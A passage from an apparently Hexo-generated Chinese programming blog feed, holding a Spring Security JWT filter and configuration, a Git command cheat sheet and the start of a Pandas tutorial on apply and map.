class="keyword">implements</span> <span class="title class_">AccessDeniedHandler</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, AccessDeniedException e)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        httpServletResponse.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        httpServletResponse.setContentType(<span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> httpServletResponse.getWriter();</span><br><span class="line">        <span class="type">RespBean</span> <span class="variable">bean</span> <span class="operator">=</span> RespBean.error(<span class="string">&quot;权限不足，请联系管理员！&quot;</span>);</span><br><span class="line">        bean.setCode(<span class="number">403</span>);</span><br><span class="line">        out.write(<span class="keyword">new</span> <span class="title class_">ObjectMapper</span>().writeValueAsString(bean));</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="配置授权过滤器">配置授权过滤器</span></h3><blockquote><p>OncePerRequestFilter</p></blockquote><ul><li>jwt版本</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.disda.cowork.config.security.components;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.authentication.UsernamePasswordAuthenticationToken;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.context.SecurityContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetails;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetailsService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.web.authentication.WebAuthenticationDetailsSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.filter.OncePerRequestFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: cowork-back</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: jwt 登录授权过滤器</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: disda</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2022-01-24 14:52</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtAuthenticationTokenFilter</span> <span class="keyword">extends</span> <span class="title class_">OncePerRequestFilter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jwt.tokenHeader&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String tokenHeader;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jwt.tokenHead&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String tokenHead;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JwtTokenUtil jwtTokenUtil;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserDetailsService userDetailsService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doFilterInternal</span><span class="params">(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 浏览器传过来的request请求中</span></span><br><span class="line"><span class="comment">         * key value</span></span><br><span class="line"><span class="comment">         * key为配置中的tokenHeader</span></span><br><span class="line"><span class="comment">         * value为配置中的tokenHead+空格+token</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">authHeader</span> <span class="operator">=</span> request.getHeader(tokenHeader);</span><br><span class="line">        <span class="comment">// 存在token</span></span><br><span class="line">        <span class="keyword">if</span>(authHeader!=<span class="literal">null</span>&amp;&amp;authHeader.startsWith(tokenHead))&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">authToken</span> <span class="operator">=</span> authHeader.substring(tokenHead.length());</span><br><span class="line">            <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> jwtTokenUtil.getUserNameFromToken(authToken);</span><br><span class="line">            <span class="comment">// token存在用户名，但是未登录</span></span><br><span class="line">            <span class="keyword">if</span>(username!=<span class="literal">null</span> &amp;&amp; SecurityContextHolder.getContext().getAuthentication() == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="comment">// 登录</span></span><br><span class="line">                <span class="type">UserDetails</span> <span class="variable">userDetails</span> <span class="operator">=</span> userDetailsService.loadUserByUsername(username);</span><br><span class="line">                <span class="comment">// 验证Token是否有效，重新设置用户对象</span></span><br><span class="line">                <span class="keyword">if</span>(jwtTokenUtil.validateToken(authToken,userDetails))&#123;</span><br><span class="line">                    <span class="type">UsernamePasswordAuthenticationToken</span> <span class="variable">authenticationToken</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsernamePasswordAuthenticationToken</span>(userDetails,<span class="literal">null</span>,userDetails.getAuthorities());</span><br><span class="line">                    authenticationToken.setDetails(<span class="keyword">new</span> <span class="title class_">WebAuthenticationDetailsSource</span>().buildDetails(request));</span><br><span class="line">                    SecurityContextHolder.getContext().setAuthentication(authenticationToken);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="配置spring-security">配置Spring Security</span></h3><blockquote><p>SecurityConfig extends WebSecurityConfigurerAdapter</p></blockquote><ul><li>jwt版本</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">//使用JWT，不需要csrf，关闭csrf防范</span></span><br><span class="line">    http</span><br><span class="line">            .csrf().disable()</span><br><span class="line">            <span class="comment">//基于token，不需要session</span></span><br><span class="line">            .sessionManagement()</span><br><span class="line">            .sessionCreationPolicy(SessionCreationPolicy.STATELESS)</span><br><span class="line">            .and()</span><br><span class="line">            <span class="comment">//授权认证</span></span><br><span class="line">            .authorizeRequests()</span><br><span class="line">            <span class="comment">//所有请求都要求认证,必须登录后被访问</span></span><br><span class="line">            .anyRequest().authenticated()</span><br><span class="line">            <span class="comment">//动态权限配置</span></span><br><span class="line">            .withObjectPostProcessor(<span class="keyword">new</span> <span class="title class_">ObjectPostProcessor</span>&lt;FilterSecurityInterceptor&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> &lt;O <span class="keyword">extends</span> <span class="title class_">FilterSecurityInterceptor</span>&gt; O <span class="title function_">postProcess</span><span class="params">(O object)</span> &#123;</span><br><span class="line">                    object.setAccessDecisionManager(customUrlDecisionManager);</span><br><span class="line">                    object.setSecurityMetadataSource(customFilter);</span><br><span class="line">                    <span class="keyword">return</span> object;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">            .and()</span><br><span class="line">            <span class="comment">//禁用缓存</span></span><br><span class="line">            .headers()</span><br><span class="line">            .cacheControl();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加jwt 登录授权过滤器</span></span><br><span class="line">    http.addFilterBefore(jwtAuthencationTokenFilter(), UsernamePasswordAuthenticationFilter.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//异常处理</span></span><br><span class="line">    <span class="comment">// 添加自定义未授权和未登录结果返回</span></span><br><span class="line">    http.exceptionHandling()</span><br><span class="line">            .accessDeniedHandler(restfulAccessDeniedHandler)</span><br><span class="line">            .authenticationEntryPoint(restAuthorizationEntryPoint);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="面经" scheme="https://disda-coding.github.io/categories/%E9%9D%A2%E7%BB%8F/"/>
    
    
    <category term="Spring" scheme="https://disda-coding.github.io/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>Git操作</title>
    <link href="https://disda-coding.github.io/2022/04/22/git/"/>
    <id>https://disda-coding.github.io/2022/04/22/git/</id>
    <published>2022-04-22T02:14:09.000Z</published>
    <updated>2023-03-29T01:03:37.104Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">基本操作</a></li><li><a href="#%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6">版本控制</a></li><li><a href="#%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93">远程仓库</a></li><li><a href="#%E5%88%86%E6%94%AF">分支</a></li><li><a href="#%E6%A0%87%E7%AD%BErelease-%E5%8F%91%E8%A1%8C%E7%89%88">标签Release 发行版</a></li><li><a href="#idea">Idea</a></li></ul><!-- tocstop --><h2><span id="基本操作">基本操作</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">git init <span class="comment"># 新建git仓库</span></span><br><span class="line">git add &lt;filename/directory/.&gt; <span class="comment"># 将工作区的文件、目录、所有文件添加到stage</span></span><br><span class="line">git commit -m <span class="string">&quot;commit&quot;</span> <span class="comment"># 将stage的文件添加到版本库中</span></span><br><span class="line">git commit -am <span class="string">&quot;commit&quot;</span> <span class="comment"># 上两步合二为一</span></span><br><span class="line">git commit -a <span class="comment"># 更加简化</span></span><br><span class="line">git status <span class="comment"># 查看git状态</span></span><br><span class="line">git <span class="built_in">log</span> <span class="comment"># 查看提交日志</span></span><br><span class="line">git <span class="built_in">log</span> 5 --pretty=oneline <span class="comment"># 方便查看日志</span></span><br><span class="line">git diff <span class="comment"># 查看区别</span></span><br><span class="line">git <span class="built_in">rm</span> filename <span class="comment"># 删除文件</span></span><br><span class="line">git ls-files <span class="comment"># 查看本地仓库文件</span></span><br></pre></td></tr></table></figure><h2><span id="版本控制">版本控制</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git reset HEAD <span class="comment"># 将stage中的文件清空（撤销git add操作）</span></span><br><span class="line">git reset --hard HEAD^^ <span class="comment"># 所有区域回退到上上个版本 取决于^的数量</span></span><br><span class="line">git reset --hard HEAD~1 <span class="comment"># 回退一个版本</span></span><br><span class="line">git reset --hard 标识符 <span class="comment"># 回退到某个版本，输入5位+，不重复即可</span></span><br><span class="line">git reflog <span class="comment"># 查看之前的引用位置，防止无法回滚</span></span><br><span class="line"></span><br><span class="line">git checkout --filename <span class="comment">#恢复已提交的误删除工作区的文件</span></span><br></pre></td></tr></table></figure><h2><span id="远程仓库">远程仓库</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> url <span class="comment"># 下载远程仓库项目</span></span><br><span class="line">git push origin branch <span class="comment"># 推送本地分支到远程</span></span><br><span class="line">git push origin :remote_branch <span class="comment"># 删除远程分支</span></span><br><span class="line">git checkout -b local_branch origin/remote_branch <span class="comment"># 拉取远程指定分支并在本地创建分支</span></span><br><span class="line">git fetch <span class="comment"># 获取分支</span></span><br><span class="line">git pull <span class="comment"># 拉取最新内容</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;多人协作&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 提交前先pull</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="分支">分支</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git checkout branch <span class="comment"># 切换到指定分支</span></span><br><span class="line">git checkout -b new_branch <span class="comment"># 新建分支并切换到新建分支</span></span><br><span class="line">git branch -d branch <span class="comment"># 删除指定分支</span></span><br><span class="line">git branch <span class="comment"># 查看所有分支 *代表目前分支</span></span><br><span class="line">git branch -m oldBranch newBranch 重命名分支</span><br><span class="line">git branch -a <span class="comment"># 查看本地和远程分支</span></span><br></pre></td></tr></table></figure><h2><span id="标签release-发行版">标签Release 发行版</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git tag tagName <span class="comment"># 新建标签 默认为HEAD</span></span><br><span class="line">git tage -a tag_name -m <span class="string">&#x27;xx&#x27;</span> <span class="comment"># 添加标签并指定描述信息</span></span><br><span class="line">git tag <span class="comment"># 查看所有标签</span></span><br><span class="line">git tag -d tag_name <span class="comment"># 删除本地标签</span></span><br><span class="line">git push origin tag_name <span class="comment"># 推送本地标签到远程</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="idea">Idea</span></h2><ul><li>下载插件.ignore</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="面试" scheme="https://disda-coding.github.io/categories/%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="git" scheme="https://disda-coding.github.io/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>Pandas基础</title>
    <link href="https://disda-coding.github.io/2022/04/13/Pandas/"/>
    <id>https://disda-coding.github.io/2022/04/13/Pandas/</id>
    <published>2022-04-13T07:42:27.000Z</published>
    <updated>2023-03-29T01:03:25.366Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#%E6%95%B0%E6%8D%AE%E8%AF%BB%E5%8F%96%E5%A4%84%E7%90%86">数据读取处理</a><ul><li><a href="#%E9%80%89%E6%8B%A9%E5%88%97">选择列</a></li><li><a href="#%E9%80%89%E6%8B%A9%E8%A1%8C">选择行</a></li></ul></li><li><a href="#%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%96">数据格式化</a></li><li><a href="#%E6%97%A5%E6%9C%9F">日期</a></li><li><a href="#crud">CRUD</a><ul><li><a href="#%E5%88%97%E6%93%8D%E4%BD%9C">列操作</a></li><li><a href="#%E8%A1%8C%E6%93%8D%E4%BD%9C">行操作</a></li></ul><ul><li><a href="#create">Create</a></li><li><a href="#del">Del</a></li><li><a href="#update">Update</a></li><li><a href="#retrieve">Retrieve</a></li></ul></li><li><a href="#%E4%BF%9D%E5%AD%98%E6%96%87%E4%BB%B6">保存文件</a></li><li><a href="#tricks">Tricks</a></li><li><a href="#matplotlib">matplotlib</a></li><li><a href="#tips">Tips</a><ul><li><a href="#%E5%B1%8F%E8%94%BD%E6%8F%90%E9%86%92">屏蔽提醒</a></li><li><a href="#%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87">显示中文</a></li><li><a href="#%E5%85%B3%E4%BA%8Eiloc%E5%92%8C%E9%80%89%E6%8B%A9%E8%B5%8B%E5%80%BC%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98">关于iloc和[]选择赋值失败问题</a></li></ul></li></ul><!-- tocstop --><h2><span id="数据读取处理">数据读取处理</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iris = load_iris()</span><br><span class="line">lable = iris.feature_names</span><br><span class="line">target = iris.target</span><br><span class="line">feature = iris.data</span><br><span class="line">data = np.column_stack((feature,target))</span><br><span class="line">lable.append(<span class="string">&#x27;type&#x27;</span>)</span><br><span class="line">df = pd.DataFrame(data,columns=lable)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.reshape(-<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">a[:,np.newaxis]</span><br></pre></td></tr></table></figure><h3><span id="选择列">选择列</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tr.select_dtypes(include=[<span class="string">&#x27;int64&#x27;</span>,<span class="string">&#x27;float64&#x27;</span>])</span><br></pre></td></tr></table></figure><h3><span id="选择行">选择行</span></h3><ul><li>可以通过 “.”  来操作 <code>df.a</code></li><li>也可以通过 “[]” 来操作 <code>df[&#39;a&#39;]</code></li></ul><h2><span id="数据格式化">数据格式化</span></h2><ol><li>map、apply在用于Series时，对每一个值进行处理，两者并没有什么区别</li><li>apply不仅可以用于Series，还可以用于DataFrame；而map只能用于Series。</li><li>一般情况下，apply应用更广泛，尤其是自定义函数带多个参数时，建议使用apply。</li><li>applymap可以对多个Series进行操作，map和apply均不行。</li></ol><ul><li><p><strong>apply &#x2F;map&#x2F;applymap</strong>  函数（常用方法）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cal_interval</span>(<span class="params">df,from_date,to_date</span>):</span><br><span class="line">    delta = <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = datetime.datetime.strptime(df[from_date],<span class="string">&quot;%m/%d/%Y&quot;</span>)</span><br><span class="line">        t = datetime.datetime.strptime(df[to_date],<span class="string">&quot;%m/%d/%Y&quot;</span>)</span><br><span class="line">        delta = (t-f).days</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span> delta&lt;=<span class="number">0</span> <span class="keyword">else</span> delta</span><br><span class="line">  df[<span class="string">&#x27;d&#x27;</span>] = df.apply(cal_interval,axis=<span class="number">1</span>,args=[<span class="string">&#x27;Date Event Began&#x27;</span>,<span class="string">&#x27;Date of Restoration&#x27;</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">date = pd.period_range(start = <span class="string">&#x27;1990-02-01&#x27;</span>,periods=<span class="number">100</span>,freq=<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">&#x27;date&#x27;</span>:date,<span class="string">&#x27;val&#x27;</span>:np.random.randn(<span class="built_in">len</span>(date)),<span class="string">&#x27;val2&#x27;</span>:np.random.randn(<span class="built_in">len</span>(date))&#125;)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="right"></th><th align="right">date</th><th align="right">val</th><th>val2</th></tr></thead><tbody><tr><td align="right">0</td><td align="right">1990-02-01</td><td align="right">0.771114</td><td>0.223646</td></tr><tr><td align="right">1</td><td align="right">1990-02-02</td><td align="right">-0.630781</td><td>-1.231217</td></tr><tr><td align="right">2</td><td align="right">1990-02-03</td><td align="right">-0.435648</td><td>-1.324931</td></tr><tr><td align="right">3</td><td align="right">1990-02-04</td><td align="right">2.459657</td><td>1.195601</td></tr><tr><td align="right">4</td><td align="right">1990-02-05</td><td align="right">0.378009</td><td>2.207286</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># apply默认是作用于列，要作用于行的话需要加上axis=1</span></span><br><span class="line">q2.apply(<span class="keyword">lambda</span> x:x.原价==x.实价,axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 保留两位小数（类型变成Object）</span></span><br><span class="line">df.val.apply(<span class="keyword">lambda</span> x: <span class="built_in">format</span>(x,<span class="string">&#x27;.2f&#x27;</span>))</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">df.val.apply(<span class="keyword">lambda</span> x: <span class="string">&#x27;&#123;:.2f&#125;&#x27;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"><span class="comment"># 四舍五入保留两位小数</span></span><br><span class="line">df.val.<span class="built_in">round</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转为百分比，并保留2位小数 lambda 写法</span></span><br><span class="line">df.val.<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="string">&quot;&#123;:.2%&#125;&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">q2_df[col].apply(<span class="keyword">lambda</span> x:<span class="built_in">format</span>(x,<span class="string">&#x27;.2%&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正常函数写法（不推荐）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">turn_percentage</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%.2f%%&#x27;</span> % (x * <span class="number">100</span>);</span><br><span class="line">df.val.apply(turn_percentage)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将获奖时间格式化为x月x日</span></span><br><span class="line">df.date.apply(<span class="keyword">lambda</span> x:x.strftime(<span class="string">&#x27;%m月%d日&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将Series中的数据和字符拼接</span></span><br><span class="line">df.val.apply(<span class="keyword">lambda</span> x: <span class="string">f&#x27;随机数： <span class="subst">&#123;x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># applymap可以对多个Series进行操作</span></span><br><span class="line">df[[<span class="string">&#x27;val&#x27;</span>,<span class="string">&#x27;val1&#x27;</span>]].applymap(<span class="keyword">lambda</span> x:<span class="built_in">format</span>(x,<span class="string">&#x27;.2f&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建apply函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">judge_state</span>(<span class="params">row</span>):</span><br><span class="line">    <span class="keyword">if</span> row[<span class="string">&#x27;Austin - EV&#x27;</span>] &lt;=<span class="number">0.01</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Off&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> row[<span class="string">&#x27;Austin - EV&#x27;</span>]&gt;<span class="number">0.01</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;On&#x27;</span></span><br><span class="line"><span class="comment"># 应用apply函数</span></span><br><span class="line">df_Austin_ev = df.apply(judge_state,axis = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># map传入字典 其余值均变为NaN</span></span><br><span class="line">df1 = pd.DataFrame(&#123;<span class="string">&#x27;A&#x27;</span>:[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]&#125;)</span><br><span class="line">df1.A=df1.A.<span class="built_in">map</span>(&#123;<span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;b&#x27;</span>:<span class="string">&#x27;B&#x27;</span>&#125;) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># df使用apply还可以传其他参</span></span><br><span class="line"><span class="keyword">import</span> statsmodels.api <span class="keyword">as</span> sm</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">regress</span>(<span class="params">data, yvar, xvars</span>):</span><br><span class="line">    Y = data[yvar]</span><br><span class="line">    X = data[xvars]</span><br><span class="line">    X[<span class="string">&#x27;intercept&#x27;</span>] = <span class="number">1.</span></span><br><span class="line">    result = sm.OLS(Y, X).fit()</span><br><span class="line">    <span class="keyword">return</span> result.params</span><br><span class="line">  </span><br><span class="line">by_year.apply(regress, <span 